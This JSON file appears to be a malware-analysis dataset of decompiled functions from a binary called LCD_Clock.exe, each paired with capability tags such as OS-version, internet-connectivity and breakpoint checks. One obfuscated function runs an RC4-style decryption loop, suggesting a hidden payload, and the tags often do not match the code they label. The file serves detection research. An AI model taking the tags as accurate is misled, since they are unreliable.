{
    "00401005": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401005(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint arg_8h;\n    uint uVar4;\n    uint var_1ch;\n    uint hdcDest;\n    uint lpSystemTime;\n    uint var_ch;\n    uint16_t var_8h;\n    uint16_t var_6h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    uVar2 = (*_sym.imp.USER32.dll_GetDC)(*(param_1 + 0x18));\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)(&lpSystemTime);\n    (*_sym.imp.GDI32.dll_StretchBlt)(uVar2, 0, 0, 0x6f, 0x15, *(param_1 + 0x10), 0xaa, 0, 2, 0x15, 0xcc0020);\n    pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n    if (*(param_1 + 0x1c) == '\\0') {\n        uVar3 = var_ch;\n        (*_sym.imp.GDI32.dll_BitBlt)(uVar2, 2, 0, 0xd, 0x15, *(param_1 + 0x10), (uVar3 / 10) * 0xd, 0, 0xcc0020);\n        (*_sym.imp.GDI32.dll_BitBlt)(uVar2, 0xf, 0, 0xd, 0x15, *(param_1 + 0x10), (uVar3 % 10) * 0xd, 0, 0xcc0020);\n    }\n    else {\n        uVar3 = var_ch;\n        if (0xc < var_ch) {\n            uVar3 = uVar3 - 0xc;\n        }\n        (*_sym.imp.GDI32.dll_BitBlt)(uVar2, 2, 0, 0xd, 0x15, *(param_1 + 0x10), (uVar3 / 10) * 0xd, 0, 0xcc0020);\n        (*pcVar1)(uVar2, 0xf, 0, 0xd, 0x15, *(param_1 + 0x10), (uVar3 % 10) * 0xd, 0, 0xcc0020);\n    }\n    (*_sym.imp.GDI32.dll_BitBlt)(uVar2, 0x23, 0, 0xd, 0x15, *(param_1 + 0x10), (var_ch._2_2_ / 10) * 0xd, 0, 0xcc0020);\n    (*_sym.imp.GDI32.dll_BitBlt)(uVar2, 0x30, 0, 0xd, 0x15, *(param_1 + 0x10), (var_ch._2_2_ % 10) * 0xd, 0, 0xcc0020);\n    (*_sym.imp.GDI32.dll_BitBlt)(uVar2, 0x44, 0, 0xd, 0x15, *(param_1 + 0x10), (var_8h / 10) * 0xd, 0, 0xcc0020);\n    pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n    (*_sym.imp.GDI32.dll_BitBlt)(uVar2, 0x51, 0, 0xd, 0x15, *(param_1 + 0x10), (var_8h % 10) * 0xd, 0, 0xcc0020);\n    if (var_6h < 0x1f5) {\n        (*pcVar1)(uVar2, 0x1c, 0, 7, 0x15, *(param_1 + 0x10), 0xa3, 0, 0xcc0020);\n        uVar4 = 0xa3;\n    }\n    else {\n        (*pcVar1)(uVar2, 0x1c, 0, 7, 0x15, *(param_1 + 0x10), 0x9c, 0, 0xcc0020);\n        uVar4 = 0x9c;\n    }\n    arg_8h = 0x3d;\n    (*pcVar1)(uVar2, 0x3d, 0, 7, 0x15, *(param_1 + 0x10), uVar4, 0, 0xcc0020);\n    if (*(param_1 + 0x1c) == '\\x01') {\n        if (var_ch < 0xc) {\n            uVar4 = 0x82;\n        }\n        else {\n            uVar4 = 0x8f;\n        }\n        (*pcVar1)(uVar2, 0x60, 0, 0xd, 0x15, *(param_1 + 0x10), uVar4, 0, 0xcc0020);\n    }\n    (*_sym.imp.USER32.dll_ReleaseDC)(*(param_1 + 0x18), uVar2);\n    fcn.004023ff(arg_8h);\n    return;\n}\n",
        "token_count": 1232
    },
    "0040100a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040100a(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    uint32_t uVar9;\n    int32_t in_FS_OFFSET;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = *(*(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0xc) + 0xc);\n    iVar4 = piVar1[6];\n    while( true ) {\n        if (iVar4 == 0) {\n            return 0;\n        }\n        piVar1 = *piVar1;\n        iVar4 = 0;\n        piVar8 = piVar1[0xc];\n        iVar6 = *piVar8;\n        piVar2 = piVar8;\n        while (iVar6 != 0) {\n            piVar2 = piVar2 + 1;\n            iVar4 = iVar4 + 1;\n            iVar6 = *piVar2;\n        }\n        iVar7 = 0;\n        iVar6 = *arg_8h;\n        piVar2 = arg_8h;\n        while (iVar6 != 0) {\n            piVar2 = piVar2 + 1;\n            iVar7 = iVar7 + 1;\n            iVar6 = *piVar2;\n        }\n        if (iVar4 == iVar7) break;\ncode_r0x00401fa9:\n        iVar4 = piVar1[6];\n    }\n    uVar9 = 0;\n    iVar4 = arg_8h - piVar8;\n    do {\n        iVar6 = *piVar8;\n        uVar5 = 0;\n        piVar2 = piVar8;\n        if (iVar6 == 0) {\ncode_r0x00401fbf:\n            return piVar1[6];\n        }\n        do {\n            piVar2 = piVar2 + 1;\n            uVar5 = uVar5 + 1;\n        } while (*piVar2 != 0);\n        if (uVar5 <= uVar9) goto code_r0x00401fbf;\n        iVar3 = *(iVar4 + piVar8);\n        if (iVar6 - 0x41U < 0x1a) {\n            iVar6 = iVar6 + 0x20;\n        }\n        if (iVar3 - 0x41U < 0x1a) {\n            iVar3 = iVar3 + 0x20;\n        }\n        if (iVar6 != iVar3) goto code_r0x00401fa9;\n        uVar9 = uVar9 + 1;\n        piVar8 = piVar8 + 1;\n    } while( true );\n}\n",
        "token_count": 639
    },
    "0040102d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040102d(int32_t param_1)\n\n{\n    uint uVar1;\n    uint var_14h;\n    int32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    uVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)(&var_14h);\n    (*_sym.imp.USER32.dll_GetWindowRect)(uVar1);\n    if (*(param_1 + 0x1c) == '\\x01') {\n        uVar1 = 0x6f;\n        var_ch = var_ch + -0xb5;\n    }\n    else {\n        uVar1 = 0x60;\n        var_ch = var_ch + -0xa6;\n    }\n    (*_sym.imp.USER32.dll_SetWindowPos)(*(param_1 + 0x18), 0xffffffff, var_ch, 0, uVar1, 0x15, 0);\n    uVar1 = 0x4b0;\n    (*_sym.imp.USER32.dll_SetTimer)(*(param_1 + 0x18), 0x4b0, 500, 0);\n    fcn.004023ff(uVar1);\n    return;\n}\n",
        "token_count": 281
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nsym.LCD_Clock.exe_lhxXfY9mIrDZ(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint8_t *arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint32_t arg_8h_00;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *0x43502c;\n    iVar3 = fcn.004025d7(*0x43502c);\n    puVar4 = fcn.004025d7(arg_8h_00);\n    if (arg_8h_00 != 0) {\n        uVar6 = 0;\n        do {\n            (uVar6 + iVar3)[puVar4 - iVar3] = uVar6;\n            arg_8h_00 = *0x43502c;\n            uVar5 = uVar6 + 1;\n            *(uVar6 + iVar3) = *(uVar6 % arg_14h + arg_10h);\n            uVar6 = uVar5;\n        } while (uVar5 < arg_8h_00);\n    }\n    uVar5 = 0;\n    uVar6 = 0;\n    if (arg_8h_00 != 0) {\n        puVar7 = puVar4;\n        var_ch = arg_8h_00;\n        do {\n            uVar5 = (*puVar7 + (puVar7 + 1)[(iVar3 - puVar4) + -1] + uVar5) % arg_8h_00;\n            var_ch = var_ch - 1;\n            uVar1 = puVar4[uVar5];\n            puVar4[uVar5] = *puVar7;\n            *puVar7 = uVar1;\n            uVar6 = arg_8h_00;\n            puVar7 = puVar7 + 1;\n        } while (var_ch != 0);\n    }\n    var_ch = 0;\n    if (0 < arg_ch) {\n        arg_8h = arg_8h - arg_18h;\n        do {\n            uVar6 = (uVar6 + 1) % arg_8h_00;\n            var_ch = (puVar4[uVar6] + var_ch) % arg_8h_00;\n            uVar1 = puVar4[var_ch];\n            puVar4[var_ch] = puVar4[uVar6];\n            puVar4[uVar6] = uVar1;\n            uVar2 = puVar4[var_ch];\n            (*_sym.imp.USER32.dll_ShowWindow)(0, 0);\n            *arg_18h = arg_18h[arg_8h] ^ puVar4[(uVar1 + uVar2) % arg_8h_00];\n            arg_18h = arg_18h + 1;\n            arg_ch = arg_ch + -1;\n            arg_8h_00 = *0x43502c;\n        } while (arg_ch != 0);\n    }\n    return;\n}\n",
        "token_count": 750
    },
    "00401c80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401c80(uint arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    uint uVar2;\n    uint *arg_8h_00;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    if (arg_ch == 2) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        fcn.004023ff(unaff_ESI);\n        return;\n    }\n    if (arg_ch == 0xf) {\n        (*_sym.imp.USER32.dll_BeginPaint)(arg_8h, &var_44h);\n        arg_8h_00 = &var_44h;\n        (*_sym.imp.USER32.dll_EndPaint)(arg_8h);\n        fcn.004023ff(arg_8h_00);\n        return;\n    }\n    if (arg_ch != 0x111) {\n        (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n        fcn.004023ff(arg_ch);\n        return;\n    }\n    uVar1 = arg_10h & 0xffff;\n    if (uVar1 != 0x69) {\n        if (uVar1 == 0x8006) {\n            uVar2 = 0x436918;\n            (*_sym.imp.USER32.dll_MessageBoxA)(arg_8h, 0x436918, 0x42cd20, 0x40);\n            fcn.004023ff(uVar2);\n            return;\n        }\n        if (uVar1 != 0x8007) {\n            uVar2 = 0x111;\n            (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, 0x111, arg_10h, arg_14h);\n            fcn.004023ff(uVar2);\n            return;\n        }\n        *0x4368ac = *0x4368ac == '\\0';\n        fcn.0040104b(*0x4368ac);\n        fcn.004023ff(unaff_ESI);\n        return;\n    }\n    (*_sym.imp.USER32.dll_DestroyWindow)(arg_8h);\n    fcn.004023ff(unaff_ESI);\n    return;\n}\n",
        "token_count": 543
    },
    "0040104b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040104b(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint uVar1;\n    uint var_14h;\n    int32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    *(in_ECX + 0x1c) = arg_8h;\n    if (arg_8h == '\\x01') {\n        uVar1 = 8;\n    }\n    else {\n        uVar1 = 0;\n    }\n    (*_sym.imp.USER32.dll_CheckMenuItem)(*(in_ECX + 8), 0x8007, uVar1);\n    uVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)(&var_14h);\n    (*_sym.imp.USER32.dll_GetWindowRect)(uVar1);\n    if (*(in_ECX + 0x1c) == '\\x01') {\n        uVar1 = 0x6f;\n        var_ch = var_ch + -0xb5;\n    }\n    else {\n        uVar1 = 0x60;\n        var_ch = var_ch + -0xa6;\n    }\n    arg_8h_00 = 0xffffffff;\n    (*_sym.imp.USER32.dll_SetWindowPos)(*(in_ECX + 0x18), 0xffffffff, var_ch, 0, uVar1, 0x15, 0);\n    fcn.004023ff(arg_8h_00);\n    return;\n}\n",
        "token_count": 349
    },
    "00401340": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401340(int32_t param_1)\n\n{\n    uint uVar1;\n    uint arg_8h;\n    uint var_14h;\n    int32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    uVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)(&var_14h);\n    (*_sym.imp.USER32.dll_GetWindowRect)(uVar1);\n    if (*(param_1 + 0x1c) == '\\x01') {\n        uVar1 = 0x6f;\n        var_ch = var_ch + -0xb5;\n    }\n    else {\n        uVar1 = 0x60;\n        var_ch = var_ch + -0xa6;\n    }\n    arg_8h = 0xffffffff;\n    (*_sym.imp.USER32.dll_SetWindowPos)(*(param_1 + 0x18), 0xffffffff, var_ch, 0, uVar1, 0x15, 0);\n    fcn.004023ff(arg_8h);\n    return;\n}\n",
        "token_count": 252
    },
    "00401e10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401e10(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int16_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    \n    iVar3 = 0;\n    iVar5 = *arg_8h;\n    piVar1 = arg_8h;\n    while (iVar5 != 0) {\n        piVar1 = piVar1 + 1;\n        iVar3 = iVar3 + 1;\n        iVar5 = *piVar1;\n    }\n    iVar6 = 0;\n    iVar5 = *arg_ch;\n    piVar1 = arg_ch;\n    while (iVar5 != 0) {\n        piVar1 = piVar1 + 1;\n        iVar6 = iVar6 + 1;\n        iVar5 = *piVar1;\n    }\n    if (iVar3 != iVar6) {\n        return 1;\n    }\n    uVar7 = 0;\n    iVar3 = arg_ch - arg_8h;\n    while( true ) {\n        iVar5 = *arg_8h;\n        uVar4 = 0;\n        piVar1 = arg_8h;\n        if (iVar5 == 0) {\n            return 0;\n        }\n        do {\n            piVar1 = piVar1 + 1;\n            uVar4 = uVar4 + 1;\n        } while (*piVar1 != 0);\n        if (uVar4 <= uVar7) break;\n        iVar2 = *(iVar3 + arg_8h);\n        if (iVar5 - 0x41U < 0x1a) {\n            iVar5 = iVar5 + 0x20;\n        }\n        if (iVar2 - 0x41U < 0x1a) {\n            iVar2 = iVar2 + 0x20;\n        }\n        if (iVar5 != iVar2) {\n            return 1;\n        }\n        uVar7 = uVar7 + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 487
    },
    "00401ed0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401ed0(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = *arg_8h;\n    while (iVar1 != 0) {\n        arg_8h = arg_8h + 1;\n        iVar2 = iVar2 + 1;\n        iVar1 = *arg_8h;\n    }\n    return iVar2;\n}\n",
        "token_count": 107
    },
    "00402cb3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402cb3(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x43735c, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00403fac();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00404005(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00403673": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403673(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.00402cb3(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 81
    },
    "004027ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004027ae(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_38h_2;\n    code *pcStack56;\n    uint32_t uStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *var_18h_2;\n    int32_t var_14h_2;\n    uint *var_10h;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    var_18h_2 = &stack0xfffffffc;\n    puStack32 = &stack0xffffffc0;\n    if (var_34h == 0x123) {\n        *var_30h = 0x402857;\n        var_4h = 1;\n    }\n    else {\n        pcStack56 = fcn.0040269a;\n        uStack52 = *0x435040 ^ &fcn.004027ae::var_38h_2;\n        uStack48 = var_24h;\n        puStack44 = var_30h;\n        uStack40 = var_20h;\n        uStack36 = var_1ch;\n        var_14h_2 = 0;\n        var_38h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004027ae::var_38h_2;\n        var_4h = 1;\n        var_10h = var_34h;\n        var_ch = var_2ch;\n        iVar1 = fcn.00404224();\n        var_8h = *(iVar1 + 0x80);\n        (*var_8h)(*var_34h, &fcn.004027ae::var_10h);\n        var_4h = 0;\n        if (var_14h_2 == 0) {\n            *in_FS_OFFSET = var_38h_2;\n        }\n        else {\n            *var_38h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_38h_2;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 690
    },
    "00403c1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00403d10: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00403d15)\n// WARNING: Removing unreachable block (ram,0x00403d44)\n// WARNING: Removing unreachable block (ram,0x00403d1b)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403c1b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t unaff_EBP;\n    int32_t *piVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406830(0x4342f0, 0x1c);\n    fcn.00406d5b(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar5 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x436cf4 != 1) {\n        *0x436d1c = 1;\n        *0x436d18 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x438c08);\n            *(unaff_EBP + -0x2c) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar5)(*0x438c04);\n                *(unaff_EBP + -0x1c) = piVar2;\n                *(unaff_EBP + -0x20) = piVar3;\n                do {\n                    *(unaff_EBP + -0x24) = piVar3;\n                    piVar7 = piVar3;\n                    do {\n                        do {\n                            piVar7 = piVar7 + -1;\n                            *(unaff_EBP + -0x24) = piVar7;\n                            if (piVar7 < piVar2) goto code_r0x00403ce7;\n                            iVar4 = (*_sym.imp.KERNEL32.dll_EncodePointer)(0);\n                        } while (*piVar7 == iVar4);\n                        if (piVar7 < piVar2) goto code_r0x00403ce7;\n                        pcVar5 = (*pcVar5)(*piVar7);\n                        iVar4 = (*_sym.imp.KERNEL32.dll_EncodePointer)(0);\n                        *piVar7 = iVar4;\n                        (*pcVar5)();\n                        pcVar5 = _sym.imp.KERNEL32.dll_DecodePointer;\n                        uVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x438c08);\n                        *(unaff_EBP + -0x28) = uVar6;\n                        piVar3 = (*pcVar5)(*0x438c04);\n                        piVar1 = *(unaff_EBP + -0x28);\n                    } while ((*(unaff_EBP + -0x1c) == piVar1) && (*(unaff_EBP + -0x20) == piVar3));\n                    *(unaff_EBP + -0x1c) = piVar1;\n                    *(unaff_EBP + -0x2c) = piVar1;\n                    *(unaff_EBP + -0x20) = piVar3;\n                    piVar2 = piVar1;\n                } while( true );\n            }\ncode_r0x00403ce7:\n            fcn.00403bb1(0x42c628, 0x42c93c);\n        }\n        fcn.00403bb1(0x42ca40, 0x42cb44);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00406ee5(8);\n    }\n    return;\n}\n",
        "token_count": 935
    },
    "00404715": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404715(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x28);\n    fcn.004029b4(*(unaff_EBP + -0x2c));\n    iVar1 = fcn.00404224();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x30);\n    iVar1 = fcn.00404224();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x34);\n    if (((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n         ((unaff_ESI[5] == 0x19930520 || ((unaff_ESI[5] == 0x19930521 || (unaff_ESI[5] == 0x19930522)))))) &&\n        (*(unaff_EBP + -0x38) == 0)) &&\n       ((*(unaff_EBP + -0x1c) != 0 && (iVar1 = fcn.00402a04(unaff_ESI[6]),  iVar1 != 0)))) {\n        fcn.004044dc(unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "0040551f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040551f(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406830(0x4343a0, 0x10);\n    if (*(*(unaff_EBP + 0x10) + 4) < 0x81) {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    else {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar4;\n    iVar3 = fcn.00404224();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar4 != *(unaff_EBP + 0x14)) {\n        if ((iVar4 < 0) || (*(*(unaff_EBP + 0x10) + 4) <= iVar4)) {\n            fcn.0040444c();\n        }\n        iVar3 = *(unaff_EBP + 0x10);\n        iVar1 = *(iVar3 + 8);\n        uVar2 = *(iVar1 + iVar4 * 8);\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + iVar4 * 8) != 0) {\n            iVar1 = *(unaff_EBP + 8);\n            *(iVar1 + 8) = uVar2;\n            fcn.00404400(*(*(iVar3 + 8) + 4 + iVar4 * 8), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        iVar4 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = iVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004055de();\n    if (iVar4 != *(unaff_EBP + 0x14)) {\n        fcn.0040444c();\n    }\n    *(*(unaff_EBP + 8) + 8) = iVar4;\n    fcn.00406875();\n    return;\n}\n",
        "token_count": 609
    },
    "004055de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
